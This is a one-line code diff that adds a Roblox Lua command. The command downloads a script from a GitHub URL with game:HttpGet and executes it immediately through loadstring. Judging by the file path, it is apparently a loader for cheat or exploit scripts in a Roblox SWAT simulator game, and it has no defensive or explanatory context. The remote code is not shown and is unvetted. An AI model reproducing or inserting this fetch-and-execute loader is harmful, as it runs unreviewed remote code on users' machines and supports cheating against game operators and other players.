@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/tactical-swat-simulator-spam7-7uc9twpvmaj4j4.lua"))()
